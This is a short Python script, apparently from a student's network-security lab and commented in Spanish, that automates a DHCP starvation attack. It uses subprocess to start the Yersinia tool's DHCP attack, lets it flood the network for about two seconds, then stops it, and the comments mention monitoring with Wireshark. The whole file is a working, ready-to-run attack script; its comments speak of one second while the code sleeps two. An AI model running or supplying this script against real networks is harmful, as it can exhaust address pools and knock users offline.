import subprocess
import time

#primero instalar yersinia con:
#sudo apt-get install yersinia

#yersinia tiene interfaz grafica, me costo mucho encontrar la forma para iniciar el proceso con comandos: https://kali-linux.net/article/yersinia/

#aqui almaceno el comando para inicializar el ataque
comando = "yersinia dhcp -attack 1"

# Ejecuta el comando en el shell
proceso = subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# En un segundo se envian al rededor de 32mil peticiones DHCP
time.sleep(2)

# Envía una tecla al shell para finalizar el proceso
proceso.stdin.write("\n")
proceso.stdin.flush()

#Con la cancelacion del proceso en apenas un segundo, evitara que se caiga la red.

#Durante toda la fase de prueba se estuvo monitoreando con WireShark

#Isaac Fernandez
